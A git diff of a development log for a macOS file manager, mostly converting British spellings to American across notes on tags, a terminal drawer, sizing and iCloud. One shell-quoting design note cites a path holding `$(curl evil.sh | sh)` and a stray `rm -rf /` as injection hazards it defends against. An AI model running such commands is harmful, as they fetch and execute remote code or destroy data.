 a longer way to write the client. **The Git gutter keeps its column and should**: it is *text*,
-competing for the name field's colour with the mark's red and the hidden-file dim, and F2 swaps that
+competing for the name field's color with the mark's red and the hidden-file dim, and F2 swaps that
 field for an editor — none of which applies to a view that draws its own dots.
 - **`TagDotsView`** (was `TagCellView`) — an `NSView` inside `FileCellView`, right-aligned, sized by
   `intrinsicContentSize` so Auto Layout hands the name whatever the dots don't need. The name's
@@ -2896,11 +2896,11 @@ field for an editor — none of which applies to a view that draws its own dots.
   out behind it to the right — the same last-wins precedence the core found in the legacy label byte),
   and they **overlap by ~two thirds**, so five tags stay a compact cluster. The thin gap between dots
   is punched with `.destinationOut` on the view's **own layer** (hence `wantsLayer`): it erases only
-  our dots, so the row's real background shows through — a stroke in a fixed colour cannot work,
+  our dots, so the row's real background shows through — a stroke in a fixed color cannot work,
   because the background is alternating-or-blue and not ours to know.
 - **The context menu** (`PanelViewController+ContextMenu`) — the app had none at all. Built from
   `CommandCatalog` via `MainMenuBuilder.commandItem` (made internal), so a right-click item and its
-  menu-bar twin cannot drift; nil targets mean `validateMenuItem` greys them out for free (Paste with
+  menu-bar twin cannot drift; nil targets mean `validateMenuItem` grays them out for free (Paste with
   an empty clipboard, everything mutating inside an archive). Two menus: one over an entry, one over
   the empty space (folder-scoped: New Folder, Paste, Add to Favorites, Synchronize). **Tags is a
   submenu**, rebuilt on open via `NSMenuDelegate` and sharing ⌃T's item builder (`tagMenuItems`) so
@@ -2917,9 +2917,9 @@ field for an editor — none of which applies to a view that draws its own dots.
 
 **VERIFIED LIVE:** dots identical to Finder's for 1/2/5-tag files (`report.pdf` [Red, Blue] → whole
 blue leading, red sliver behind, exactly like the probe's `two.txt`); a long name truncating with an
-ellipsis before its dots; untagged rows drawing nothing; the hollow ring for colourless `Quokka`;
+ellipsis before its dots; untagged rows drawing nothing; the hollow ring for colorless `Quokka`;
 adding Green from the right-click **submenu** and watching it become the new lead dot; the entry menu,
-the background menu, Paste correctly greyed; right-click inside the marked set keeping all 7; and
+the background menu, Paste correctly grayed; right-click inside the marked set keeping all 7; and
 right-click outside it collapsing to the clicked row with **every red mark cleared**. 588 core + 33
 app tests, swiftformat + swiftlint-strict clean, artifacts removed.
 **NEXT (M6 pass 6):** the terminal drawer, or size-visualization mode — the next two `[ ]` items.
@@ -2934,21 +2934,21 @@ results tab titled with the tag. Sections now read Searches / Favorites / Volume
 two stored properties an extension cannot hold (`showsAllTags`, `renderedTagNames`) landed there, and
 `rebuild()` had to widen to internal (Swift `private` doesn't cross files — the recurring gotcha).
 - **`FinderTagColor.displayOrder` (core, +2 tests → 590).** The section needed the order Finder
-  *shows* (Red, Orange, Yellow, Green, Blue, Purple, Grey); `allCases` is raw-value order, which is
-  Apple's storage indices — it opens on Grey and buries Red. The core had already documented the
+  *shows* (Red, Orange, Yellow, Green, Blue, Purple, Gray); `allCases` is raw-value order, which is
+  Apple's storage indices — it opens on Gray and buries Red. The core had already documented the
   distinction in prose and an existing test even spelled the display order out as a **local literal**
   to assert the indices aren't it; that literal is now the property, so the test pins the real thing.
   `FinderTag.systemTags` (the stock seven, in that order) is the list both the sidebar and ⌃T offer.
-- **The ⌃T menu was listing them Grey-first**, while its own comment claimed "that is the order Finder
+- **The ⌃T menu was listing them Gray-first**, while its own comment claimed "that is the order Finder
   lists them" — false since pass 4, and invisible because nobody reads a menu's order as a bug. Now
   shares `FinderTag.systemTags`, so the comment is true and the two surfaces agree.
-- **The provider learns *colours*, not just names.** `knownTagNames: Set<String>` became a private
+- **The provider learns *colors*, not just names.** `knownTagNames: Set<String>` became a private
   `[String: FinderTag]` keyed by the lowercased name — which is the shape of the truth the core
-  established (a colour belongs to the *name*, system-wide; Finder keeps exactly such a database), so
+  established (a color belongs to the *name*, system-wide; Finder keeps exactly such a database), so
   the latest sighting wins. Without it every custom tag in the sidebar would draw as a hollow ring;
   with it, live, `Zebra` came out purple. `knownTagNames` survives as a computed property (the search
   sheet's chip completion still wants names), and the stock seven are seeded and **never overwritten**
-  by a sighting — a file carrying a malformed colourless `Red` (a shape the core found in the wild)
+  by a sighting — a file carrying a malformed colorless `Red` (a shape the core found in the wild)
   must not repaint the sidebar's Red.
 - **"All Tags…" appears only when there is something behind it.** Finder can always offer it because
   it knows every tag you own; we know the ones we have *seen* (no public API — the system's list is
@@ -3015,7 +3015,7 @@ Everything below was **probed against the real thing before any Swift was writte
   browsing ``$(curl evil.sh | sh)``) and it lands on the command line of an interactive shell.
   POSIX single quotes have no escapes, so only the quote itself needs the classic `'` → `'\''`
   bridge; **`fish` is the exception and the reason `ShellKind` distinguishes it** — its single quotes
-  *do* honour backslash escapes, so the POSIX bridge would leave a stray backslash in the path.
+  *do* honor backslash escapes, so the POSIX bridge would leave a stray backslash in the path.
   **`^U^K` before the command is a safety measure, not tidiness**: the line editor may hold a
   half-typed command, and appending `cd …` to it would execute *their* words plus ours — someone who
   typed `rm -rf /` and thought better of it would watch us run `rm -rf / cd -- '/x'`. Both keys are
@@ -3116,7 +3116,7 @@ by what the probe said:
   own popups live on (⌃T/⌃D/⌃Q) — every one of those letters is the shell's (⌃D is EOF, ⌃Q is XON),
   and the drawer is the one surface whose keystrokes belong to somebody else. No stand-aside code
   was needed: a focused terminal leaves **no pane in the responder chain**, so the pane commands
-  find no target and disable themselves — *visible in the live Go menu, entirely greyed* — and their
+  find no target and disable themselves — *visible in the live Go menu, entirely grayed* — and their
   keys fall through. ⌃D really did reach the shell as EOF. The one place that needed a hand was the
   window's Esc monitor, which would have eaten `vim`'s entire modal interface to close a preview.
 - **`ExternalTerminalLauncher`** — `ExternalDiffLauncher` verbatim over the pure model; `Open in
@@ -3135,7 +3135,7 @@ symlink** (pane stayed on `/tmp`, one `cd`, no second); `isAtPrompt` **typed not
 `sleep 15` held the foreground**, and nothing retroactively after; `exit` closed the drawer and the
 next ⌃` gave a clean screen and a fresh shell **in the active pane's directory**; and ⌘Q left **no
 orphaned shell**. GOTCHAS: (1) **a notification banner (`UserNotificationCenter`) taking front makes
-Dirnex's window non-key, which greys out *every* pane menu item and swallows ⌘L** — this looked
+Dirnex's window non-key, which grays out *every* pane menu item and swallows ⌘L** — this looked
 exactly like a focus bug I had introduced, and I nearly "fixed" a non-bug; re-tested with the banner
 gone, clicking a pane row takes focus back correctly. Verify twice before believing a UI symptom.
 (2) The drawer's first open was a **four-line sliver** — AppKit gives an item with no saved geometry
@@ -3147,7 +3147,7 @@ open/closed state persist via `NSSplitView` autosave, so a drawer left open reop
 FOLLOW-UP (user, same day): the prompt sat flush against the drawer's left border. SwiftTerm draws
 column zero against its own bounds and has **no padding API**, so the view is inset 6 pt and the
 container paints the strip — asking the *terminal* for `nativeBackgroundColor` rather than copying a
-colour, since that background moves twice (Dark Mode via `textBackgroundColor`, and OSC 11).
+color, since that background moves twice (Dark Mode via `textBackgroundColor`, and OSC 11).
 FOLLOW-UP (user, same day): **the drawer beeped on every pane switch** — "like pressing a
 non-existent shortcut", which is exactly what it was: `NSSound.beep()`, reached the long way round.
 `ShellCommandLine`'s `^U^K` opens the follow-`cd`, and **`bash` binds `^U` to readline's
@@ -3219,7 +3219,7 @@ design:
   bytes in 4 KB block round-up (ratio 0.513); conversely one **64 MB sparse LMDB file** in
   `DirnexCore/.build` allocates only 27 MB, pulling that whole tree to 1.082. So the choice matters
   and is not cosmetic. It goes to logical anyway because **the bar must agree with the number
-  rendered beside it**: a row whose bar is twice its neighbour's while its own size column reads
+  rendered beside it**: a row whose bar is twice its neighbor's while its own size column reads
   smaller is incoherent. ncdu can default to disk usage because it is a disk-usage tool *with no
   size column*; Dirnex is a file manager with one, already showing `FileEntry.byteSize`. Payoff: the
   mode reuses `DirectorySizer` exactly, with no second byte source.
@@ -3294,7 +3294,7 @@ The cache was driven against a **real filesystem change**: growing `.../a/b/file
 moved 1050 → 9050 — while the **sibling survived and was still correct**. GOTCHA (harness-only, but
 instructive): the probe **segfaulted on its first run**, in a program containing no unsafe code —
 `String(format: "%s", swiftString)`. `%s` expects a C string, and handing it a Swift `String` is
-undefined behaviour; `%@` or manual padding is the fix.
+undefined behavior; `%@` or manual padding is the fix.
 **NEXT (M6 pass 10, the app layer):** the panel toggle and the bar column drawn at **continuous
 width** with the minimum-ink rule; a `DirectorySizeProvider` owning the cache (off-main walks via
 `DirectoryLoader.size`, serialized, streamed in and seeded in bulk through `setDirectorySizes`,
@@ -3411,7 +3411,7 @@ obvious implementation would have got wrong:
   mirroring `tagMenuItems` — an `NSMenuItem` lives in one menu at a time, so items are the shareable
   unit, not menus). All three gate on `handoffTargets` = the marked set, else the cursor, filtered to
   `.local` — the line `tagTargets` already draws, so it works from a results tab (virtual pane, real
-  local hits) and greys inside an archive / on SFTP, which have no URL to hand over.
+  local hits) and grays inside an archive / on SFTP, which have no URL to hand over.
 - **Services** is the smallest piece and the one with a real trap: `NSApp.servicesMenu` is
   **single-valued**, so Services lives in the app menu (where macOS puts it) and is *not* duplicated
   into the right-click — a second copy would take the population away from the first rather than
@@ -3439,7 +3439,7 @@ rule on screen; `weird.zzzqqq` showed **"No Applications" + Other…**; the righ
 With ▸ / Share… / Services ▸; **Services listed real file services** (Show in Finder, Show Info in
 Finder, Parallels' Open/Reveal in Windows), proving the requestor is being asked; **TextEdit actually
 opened `notes.txt`** showing its real content; the **Share sheet** came up reading "notes · Text
-Document · 18 bytes" with AirDrop/Mail/Messages (nothing was sent); and both commands **greyed out
+Document · 18 bytes" with AirDrop/Mail/Messages (nothing was sent); and both commands **grayed out
 inside a zip**. **NEXT (M6 pass 12):** the automation slice M6's exit criteria actually name —
 AppleScript/Shortcuts verbs (reveal, copy, run-op) + user shell scripts receiving the selection as
 argv/env, surfaced in the palette and F-key bar — then the iCloud sync-status column, which closes
@@ -3550,7 +3550,7 @@ used. No core change (pass 12's 724 tests stand; +1 catalog test for the new com
   under the cyclomatic-complexity limit, like its siblings).
 - **Palette dispatch** (`CommandPaletteController`): `reload` joins `CommandCatalog.all` with
   `UserScriptStore.load().paletteCommands` (read fresh each open, so a just-created script is
-  searchable immediately); `runSelected` recognises a `userScript.*` id (`UserScript.name(fromCommandID:)`)
+  searchable immediately); `runSelected` recognizes a `userScript.*` id (`UserScript.name(fromCommandID:)`)
   and routes it to `runUserScript(_:)` via a synthetic `representedObject`-carrying `NSMenuItem`,
   everything else keeps the static `CommandBinding.selector` path. A new `file.manageScripts` catalog
   command (+ `CommandBinding` + File menu) makes the organizer reachable from the menu bar and palette.
@@ -3618,7 +3618,7 @@ proven end-to-end. Core-first as always; one new core file, five app touch-point
   controller **re-focuses the active pane** (`focusedPanel.focusTable()`) **then** dispatches to nil —
   which both puts the pane back in the responder chain *and* matches TC, where a function-button click
   acts on the active pane and leaves focus there. GOTCHA for the live tester: a click that has to pass
-  *through* a modal (cancelling a conflict sheet in the same batch) gets swallowed mid-animation — it
+  *through* a modal (canceling a conflict sheet in the same batch) gets swallowed mid-animation — it
   reads as an intermittent button, but a deliberate single click is 100% reliable (proven by the log).
 - **`FunctionBarView.swift`** — a `FunctionBarButton` (borderless, self-drawn: dim monospaced key token
   + primary caption, hover/press fills, a leading hairline on all but the first, `refusesFirstResponder`
@@ -3653,9 +3653,9 @@ under the sidebar** — it moved out of the window-wide container and into the *
 **second** item (the sidebar is the first and now stays full height beside it, exactly as the terminal
 drawer already did). The queue bar stays full-width in the container below. (2) **Background is the
 sidebar's vibrant material, not a flat fill** — the earlier `windowBackgroundColor` came out RGB(30,30,30),
-a near-black neutral grey that read as "black"; the app's actual dark-*blue* is the sidebar's vibrancy, so
+a near-black neutral gray that read as "black"; the app's actual dark-*blue* is the sidebar's vibrancy, so
 the bar now hosts an `NSVisualEffectView` with material **`.sidebar`** (probed live: `.windowBackground`
-renders a flat grey, `.sidebar` carries the blue tint) behind the buttons, with an `NSBox` top hairline.
+renders a flat gray, `.sidebar` carries the blue tint) behind the buttons, with an `NSBox` top hairline.
 (3) **Buttons are rounded chips filling the height** — self-drawn `NSBezierPath(roundedRect:)` per state
 (rest 0.07 / hover 0.14 / press 0.22 `labelColor` alpha, radius 6), the hairline separators dropped, a
 `fillEqually` stack with 5 pt gaps and a 3 pt vertical inset, bar height 28→**32**. GOTCHA (recurring):
@@ -3777,7 +3777,7 @@ diff classification, hence `CloudSyncStatus` throughout.
 
 App (+8 → **68**): `CloudSyncStatusProvider` (`FinderTagProvider`'s twin — off-main, per-directory,
 LRU-cached, debounced, published by notification) + `SyncBadgeView`/`SyncBadgeStyle` (SF Symbols,
-system colours; the quiet states are `secondaryLabel` because a placeholder is *not* a problem) +
+system colors; the quiet states are `secondaryLabel` because a placeholder is *not* a problem) +
 `PanelViewController+SyncStatus` + app-wide `AppPreferences.showSyncStatus` (default **on**) with a
 `view.toggleSyncStatus` command, View-menu checkmark, ⌘K palette entry and Settings ▸ Panels toggle.
 **THE design call that makes it free: the directory gate.** Tags have to look at every row to find
@@ -3803,18 +3803,18 @@ the same-file extension that already holds Workspace/Window/Application) rather 
 comments as pass 14 had to.
 
 Found in passing, **not fixed** (it is the tags feature, not this one): **iCloud rewrites a tag's
-stored colour.** Writing `Red\n6` to a file in iCloud Drive and reading it back seconds later yields
+stored color.** Writing `Red\n6` to a file in iCloud Drive and reading it back seconds later yields
 `Red\n1` — reproducible, twice, while the identical write to a local file keeps `6`. Finder still
-draws the dot red (it looks the colour up by *name*, as the pass-3 core notes it does), and Dirnex
-draws the stored colour → grey. So tag colours may be wrong on every tagged file in iCloud Drive.
+draws the dot red (it looks the color up by *name*, as the pass-3 core notes it does), and Dirnex
+draws the stored color → gray. So tag colors may be wrong on every tagged file in iCloud Drive.
 Whether Finder's own tagging UI produces the same stored state is **untested** — the AppleScript
 `label index` path writes only the legacy Finder-info byte, not `_kMDItemUserTags`, so it could not
-answer the question. Worth a pass of its own: the provider already keeps the name → colour map
+answer the question. Worth a pass of its own: the provider already keeps the name → color map
 (`known`) that a fix would consult. → **Answered and fixed in pass 17 below: Finder's own UI does it
 too, so it was every tagged file in iCloud Drive.**
 
-Progress (2026-07-17, M6 pass 17 — the iCloud tag-colour bug from pass 16; **fixed, VERIFIED LIVE
-side by side with Finder**): tag dots now take a colour from the tag's **name**, the way Finder does,
+Progress (2026-07-17, M6 pass 17 — the iCloud tag-color bug from pass 16; **fixed, VERIFIED LIVE
+side by side with Finder**): tag dots now take a color from the tag's **name**, the way Finder does,
 instead of from the byte the file stores.
 
 **The probe answered pass 16's open question, and the answer was the bad one.** Tagging a file in
@@ -3822,13 +3822,13 @@ iCloud Drive **with Finder's own right-click ▸ Tags UI** stores `Red\n1`, not 
 not after a sync delay. So this was never about hand-written attributes: it is **every tagged file in
 a user's iCloud Drive**. Three more things the probe established, each of which killed a cheaper fix:
 
-- **The rewrite is colour-blind and name-blind.** Blue lands as `Blue\n1`; a custom purple `Zebra`
-  lands as `Zebra\n1`. Every tag, whatever it is, ends up at colour **1**. Off iCloud the same writes
-  keep their colour indefinitely (`Red\n6`, `Zebra\n3`).
+- **The rewrite is color-blind and name-blind.** Blue lands as `Blue\n1`; a custom purple `Zebra`
+  lands as `Zebra\n1`. Every tag, whatever it is, ends up at color **1**. Off iCloud the same writes
+  keep their color indefinitely (`Red\n6`, `Zebra\n3`).
 - **There is no second opinion on the file.** The legacy `com.apple.FinderInfo` label byte is
-  normalised to 1 too (read `…09 02 …` on all three probe files), so the pre-tags byte the core
-  already knows how to read cannot rescue the colour.
-- **Finder's own name → colour database is not readable.** It is not in `com.apple.finder`'s plist
+  normalized to 1 too (read `…09 02 …` on all three probe files), so the pre-tags byte the core
+  already knows how to read cannot rescue the color.
+- **Finder's own name → color database is not readable.** It is not in `com.apple.finder`'s plist
   (`FavoriteTagNames` is just the stock seven); the `TagsCloudSerialNumber` key there hints at a
   private synced store, and a custom `Zebra` appears nowhere under `~/Library`. This confirms the
   pass-3 decision to accumulate sightings rather than depend on Finder's list — there is nothing to
@@ -3844,26 +3844,26 @@ drawing**, deliberately not folding it into the snapshot — `FinderTagSnapshot`
 the files say*, which is exactly what its hand-rolled `==` compares to decide a repaint.
 
 **A second instance of the same bug, found while fixing the first — and this one wrote to disk.**
-`PanelViewController+TagEditing.offeredTags` preferred "the spelling **and colour** the files
-themselves carry over the learned one", so the ⌃T menu drew Red's swatch grey for an iCloud target.
+`PanelViewController+TagEditing.offeredTags` preferred "the spelling **and color** the files
+themselves carry over the learned one", so the ⌃T menu drew Red's swatch gray for an iCloud target.
 Worse: that same `FinderTag` is the item's `representedObject`, i.e. the tag `toggleTag` **writes** —
 so tagging an iCloud file and a local file Red together wrote `Red\n1` to the *local* file, where the
-byte is not normalised and simply persists. The same leak arrives by plain copy: a tagged file copied
+byte is not normalized and simply persists. The same leak arrives by plain copy: a tagged file copied
 **out** of iCloud Drive lands locally carrying `Red\n1` forever. Resolving by name fixes the swatch,
 the write, and the copied-out file's dot. Note the old comment was already at odds with the pass-3
-core doc's own "a colour belongs to the NAME, system-wide, not to the file".
+core doc's own "a color belongs to the NAME, system-wide, not to the file".
 
-**THE judgement call: a grey sighting never displaces a colour already known** (`FinderTagIndex.learn`).
-Grey is what iCloud normalises *to*, so it is the one reading indistinguishable from the provider
-having eaten the real colour — and without the guard the fix would have **caused a regression**: a
-custom `Zebra` seen purple on the Desktop and grey in iCloud Drive would land on whichever folder was
-browsed last, flipping the Desktop's currently-correct dot to grey. Cost: genuinely recolouring a tag
-*to* grey isn't picked up until relaunch (which reseeds from the first sighting). Stock tags never
-reach this path — `learn` refuses them outright. Known edge, left alone: learning a colour does not
+**THE judgment call: a gray sighting never displaces a color already known** (`FinderTagIndex.learn`).
+Gray is what iCloud normalizes *to*, so it is the one reading indistinguishable from the provider
+having eaten the real color — and without the guard the fix would have **caused a regression**: a
+custom `Zebra` seen purple on the Desktop and gray in iCloud Drive would land on whichever folder was
+browsed last, flipping the Desktop's currently-correct dot to gray. Cost: genuinely recoloring a tag
+*to* gray isn't picked up until relaunch (which reseeds from the first sighting). Stock tags never
+reach this path — `learn` refuses them outright. Known edge, left alone: learning a color does not
 repaint a folder already scanned, so a custom tag's dot updates on that folder's next scan.
 
-LIVE (both panes on screen, next to Finder): an iCloud folder whose **every** file stores colour 1
-read blue / red / red correctly; a custom `Zebra` showed grey until the Desktop was scanned, then
+LIVE (both panes on screen, next to Finder): an iCloud folder whose **every** file stores color 1
+read blue / red / red correctly; a custom `Zebra` showed gray until the Desktop was scanned, then
 turned **purple** on the iCloud file while the Desktop's stayed purple — the guard holding. ⌃T on an
 iCloud target offered Red with a red swatch and a checkmark, Zebra in purple; toggling Red across a
 mangled `Red\n1` file and a local one wrote **`Red\n6`** to disk; a file copied out of iCloud drew
@@ -4064,8 +4064,8 @@ denied→`.denied` **guarded by `getuid() != 0`** since root ignores permission 
 **THE macOS-26 deep-link finding (live-probed, not recalled):** *both*
 `com.apple.preference.security?Privacy_AllFilesAccess` **and**
 `com.apple.settings.PrivacySecurity.extension?Privacy_AllFilesAccess` land on the Privacy & Security
-**overview**, not the FDA sub-list — Tahoe stopped honouring the anchor into the specific pane. FDA is
-one *labelled* click away, so I kept the canonical constant and wrote the copy to match ("switch on
+**overview**, not the FDA sub-list — Tahoe stopped honoring the anchor into the specific pane. FDA is
+one *labeled* click away, so I kept the canonical constant and wrote the copy to match ("switch on
 Dirnex **under** Full Disk Access"). **THE test-host gotcha:** the app test host launches the real
 delegate, so `presentIfNeeded` fired **during `xcodebuild test`** and flipped the shared-defaults
 latch (that is why the latch read `1` before I ever launched by hand); guarded with
@@ -4081,7 +4081,7 @@ degradation). 812 core + 79 app green, swiftlint `--strict` 0 violations, swiftf
 synthetic-keys quirk the pass-13 ⌘K note records — but it uses the identical `enableEscapeToCancel`
 helper every other Dirnex sheet does.)
 
-**Follow-up fix (2026-07-17, live-probed):** the "Tahoe stopped honouring the anchor" conclusion
+**Follow-up fix (2026-07-17, live-probed):** the "Tahoe stopped honoring the anchor" conclusion
 above was wrong — the anchor *name* was. Asking System Settings itself
 (`name of anchors of pane "Privacy & Security"` via AppleScript) shows the pane has **no**
 `Privacy_AllFilesAccess` anchor; the real one is **`Privacy_AllFiles`**, and an unknown anchor
@@ -4166,7 +4166,7 @@ thread** at the app layer (the disk read already is), **not** by making the sort
 **CI gating (the "XCTest metrics gated in CI" line, done as Swift-Testing budget tests).** New
 `PerformanceBudgetTests` measures best-of-N wall-clock on a seeded 100k dirty listing and **enforces
 budgets only in release** (`#if !DEBUG` — a debug `swift test` prints its numbers but compiles the
-`#expect`s out, since unoptimised Swift is 3–5× slower and would false-fail). A new CI step runs
+`#expect`s out, since unoptimized Swift is 3–5× slower and would false-fail). A new CI step runs
 `swift test -c release --filter PerformanceBudget`. Gates: **filter keystroke (steady) < 16 ms** and
 **(cold) < 32 ms** — both pass with margin; **100k model build < 1500 ms** as a *regression ceiling*
 (catches an accidental O(n²)/per-entry-bridging blow-up; not the 150 ms target, which is off-main).
@@ -4203,7 +4203,7 @@ This pass does that for every path that builds a pane's `DirectoryModel`. Core�
   `Panel` gained `setModel(_:)` — the off-main twin of `setListing`: it installs an already-sorted
   model and does **only** the cheap cursor/selection reconciliation (same refresh-vs-navigation
   decision by path, now factored into a shared `reconcile`), never a re-sort. **Second, a
-  behaviour-preserving optimisation with its own payoff:** `setDirectorySize`/`setDirectorySizes` now
+  behavior-preserving optimization with its own payoff:** `setDirectorySize`/`setDirectorySizes` now
   re-sort **only when `sort.key == .size`** (`resortIfOrderDependsOnSize`) — under a name/date/ext sort
   the totals feed the size column and selection math but never the row order, so re-running the 350 ms
   sort was pure waste. That waste was real: size-visualization streams totals in ~ten a second, each of
@@ -4255,7 +4255,7 @@ beside it — the two now run as one sequence on a fresh install.
   `FunctionBar.defaultSlots` move: a screen names its actions by `CommandCatalog` id, so the app
   resolves each to the command's title and its *effective* shortcut through the user's `KeyBindings`
   — the tour prints exactly what the menu/⌘K palette print and can never advertise a key the app no
-  longer honours.** Five screens: Welcome (dual-pane, no chip) · the command palette (`view.
+  longer honors.** Five screens: Welcome (dual-pane, no chip) · the command palette (`view.
   commandPalette`) · file ops (`file.copy/move/newFolder/trash`) · navigation (`go.editLocation`,
   `file.newTab`, `go.favorites`) · You're-ready (`app.fullDiskAccess`). +7 tour tests pin length ≤ 5,
   well-formedness, unique ids, that **every highlighted id resolves to a real catalog command**, that
@@ -4401,7 +4401,7 @@ publishes the **DMG to the per-tag release** (stable `--latest`, beta `--prerele
 "Latest" always points at stable), and re-uploads the merged appcast to the `appcast` release
 (`--clobber`, drafts skip the live feed). **`SUFeedURL` moved** from `releases/latest/download/…` to
 `releases/download/appcast/appcast.xml` (the stable feed URL). **Migration gotcha (documented in
-RELEASING.md): builds ≤ v0.0.3 still poll the old `latest/…` URL, so the first channelled release
+RELEASING.md): builds ≤ v0.0.3 still poll the old `latest/…` URL, so the first channeled release
 must be installed manually once** — the design accepted this ("no external users on the old feed
 yet").
 
@@ -4453,7 +4453,7 @@ a Sparkle-free stand-in for `SPUUserUpdateChoice`) is a value type whose transit
 **dismiss keeps the badge** (the user postponed; that is precisely what the ambient signal is for),
 while **skip and install clear it** (Sparkle will not raise a skipped version again on its own, and
 an install is about to relaunch into it). 11 tests pin that, plus the blank/whitespace version
-normalisation that keeps the tooltip from reading "Dirnex  is available". The app half is adapter
+normalization that keeps the tooltip from reading "Dirnex  is available". The app half is adapter
 only: `AppUpdater` gained `didFindValidUpdate` / `updaterDidNotFindUpdate` /
 `userDidMake:forUpdate:state:`, each a one-line assignment into an `availability` property whose
 `didSet` posts `AppUpdater.availabilityDidChange`; `BrowserWindowController+Updates` mirrors it.
@@ -4487,7 +4487,7 @@ instruments.
 trademark rights, plus a patent grant with a retaliation clause. Under MIT the name question is
 merely unaddressed — the reader has to know trademark law applies independently. Apache states it in
 the license the forker is already reading. `LICENSE` is the canonical text **verbatim** (sha256
-`cfc7749b…`, only the appendix copyright line filled in) so GitHub's licence detector recognises it
+`cfc7749b…`, only the appendix copyright line filled in) so GitHub's license detector recognizes it
 and nobody has to diff it against upstream to trust it.
 
 **The icon needs a separate carve-out, because §6 does not reach it.** §6 is about *trademarks* — it
@@ -4603,7 +4603,7 @@ App: `DirectorySizeRule` (`.everything` / `.gitAware(snapshot)`) makes "filtered
 what is ignored" unrepresentable, and rides through the provider's queue, which is now scope-keyed
 end to end (`queue`, `order`, `inFlight`). Space-on-dir obeys the same rule, so one size column never
 mixes two kinds of number. Per-tab toggle (View ▸ Exclude Git-Ignored from Sizes, palette, no
-shortcut), greyed outside a repository, with the status line saying **"sizes exclude Git-ignored"**
+shortcut), grayed outside a repository, with the status line saying **"sizes exclude Git-ignored"**
 whenever it is in force. `DirectorySizeProvider` watches `GitStatusProvider`'s notification and
 invalidates git-aware totals **only when `ignoredPaths` moved** — that provider republishes on every
 debounced read, so hanging invalidation on it would re-walk the tree on every ⌘S.
@@ -4612,7 +4612,7 @@ debounced read, so hanging invalidation on it would re-walk the tree on every �
 
 1. **`DirectorySizer.size` now takes two closures, and a bare trailing closure binds to `excluding`,
    not `isCancelled`.** That silently reverses what every pre-existing call meant; it failed loudly
-   here only because the two have different arities. Every call site is labelled now, and the doc
+   here only because the two have different arities. Every call site is labeled now, and the doc
    comment says why.
 2. **A landed total could be erased between its walk and its publish.** The publish used to say
    "something changed, go re-read the cache" — but any pane's FSEvents watcher invalidates every
@@ -4713,7 +4713,7 @@ silence). Menu title is now set in `validateMenuItem` — AppKit's only hook for
 live state — while the **palette keeps the generic catalog title, which is what its fuzzy search
 matches against**. `AppPreferences.diffToolIdentifier` ("" = automatic) with an Operations-tab
 picker whose footer names the installed tools, and covers the case that needs it most: none
-installed, where the command greys out with no explanation. Shortcut **⌥F3**, the sibling of F3
+installed, where the command grays out with no explanation. Shortcut **⌥F3**, the sibling of F3
 "View" — F3 looks at the file under the cursor, ⌥F3 looks at it *against* the other pane's — checked
 conflict-free under **both** presets (the TC preset claims bare F3 for Quick Look).
 
@@ -4824,7 +4824,7 @@ to reorder at all. It retires when the drag slice lands, not before.
   button** (Searches and Servers hold a handful of rows, Favorites opens with eight, and eight
   always-visible trash buttons put a row of hazards over the folders reached for most), and **no
   confirmation sheet on remove** (deleting a saved search discards a composed query that cannot be
-  recovered; this discards a pointer to a folder that has not moved — a sheet would be theatre).
+  recovered; this discards a pointer to a folder that has not moved — a sheet would be theater).
 - The main file was at 491 of its 500-line ceiling, so this pass had to *remove* as much as it
   added: `itemCell`'s favorites branch collapsed into a volume-only `volumeCell`, and the per-kind
   glyph table moved to the companion file. It sits at 494.
@@ -4917,7 +4917,7 @@ though the core half here is small: the sidebar's *keys* are pure app plumbing, 
   Application category arrays moved to a new `CommandCatalogCategories.swift` (the five widening from
   `private` to `internal`, since Swift's `private` doesn't cross files); `all` still composes them.
   The main file dropped to 213.
-- **`SidebarViewController+Keyboard.swift`** (new) is the whole interaction, modelled on
+- **`SidebarViewController+Keyboard.swift`** (new) is the whole interaction, modeled on
   `NSOutlineView` adapted to a flat table whose expand/collapse *is* the M8 fold state: **← ** steps
   an item out to its section header or collapses an open header, **→** expands a closed header or
   steps into an open one, **Return** activates an item (handing focus back to the pane, so browsing
@@ -4940,7 +4940,7 @@ present with the right glyphs — focused the sidebar onto **Home**, the left pa
 moved Home→Desktop→Documents; ← climbed to the Favorites header, ← again collapsed it *keeping the
 header selected across the rebuild*, → re-expanded it, → again stepped into Home; Return on Desktop
 navigated the pane there and **returned focus to the pane** (its `..` row went active-blue while the
-sidebar's selection dimmed to unfocused grey). Tab from the sidebar returned to the pane without
+sidebar's selection dimmed to unfocused gray). Tab from the sidebar returned to the pane without
 navigating; Tab from a pane still switched panes — no regression. Escape shares Tab's exit path and
 is not synthesizable under computer-use (docs/NOTES.md), so it rode the physical-key equivalent. The
 collapse flag toggled during the run was deleted afterward, leaving the store as found; no errors in
@@ -4948,7 +4948,7 @@ the log.
 
 Follow-up (2026-07-20, same day — the collapse-with-focus leak, VERIFIED LIVE): now that the sidebar
 can hold first responder, hiding it (⌃⌘S) *while it was focused* stranded keyboard focus on the bare
-window — both panes grey and Tab dead, since Tab is a pane key with no window-level fallback (see
+window — both panes gray and Tab dead, since Tab is a pane key with no window-level fallback (see
 docs/NOTES.md). `SidebarFocusSplitViewController` subclasses the outer split only to override
 `toggleSidebar(_:)` — the one funnel both the menu/palette and the titlebar button already call —
 capturing whether the sidebar held focus *before* `super` collapses it and handing focus to the
@@ -5120,11 +5120,11 @@ the results tab's clothes.
 
 - **A results tab's chip outlived its listing.** `customTitle` (and the query behind "Save Search…")
   was set when the tab opened and cleared only when a vanished directory reset the tab — so clicking
-  Home out of the Trash landed in the home folder with the tab still labelled "Trash". `navigate`
+  Home out of the Trash landed in the home folder with the tab still labeled "Trash". `navigate`
   now drops the whole results identity on arrival, captured *before* the load like `wasVirtual`
   beside it. Search and Recents tabs had the same bug; it is only glaring on the Trash, whose label
   is a place name rather than a query.
-- **The Trash gets its own two context menus** rather than the folder ones greyed down. What a
+- **The Trash gets its own two context menus** rather than the folder ones grayed down. What a
   trashed file offers is a different list, not a subset: no rename (the container advertises no
   `.rename`), no Pack or Paste, and a destructive tail that says `Delete Immediately…` — F8 in a
   trash already degrades to a confirmed permanent delete, so "Move to Trash" was naming the wrong
@@ -5139,7 +5139,7 @@ the results tab's clothes.
 
 Verified live on the real binary: Recents → Home and Trash → Home both relabel the chip to `oleg`;
 both Trash menus render as designed with every item live; Empty Trash… from the pane's background
-opens the counted confirmation; New Folder is greyed in the File menu inside the Trash.
+opens the counted confirmation; New Folder is grayed in the File menu inside the Trash.
 
 **Restore pass (2026-07-21):** Put Back, per item and for the whole Trash.
 
@@ -5172,7 +5172,7 @@ the volume root; a **decoy** at the original path produced "already back" with t
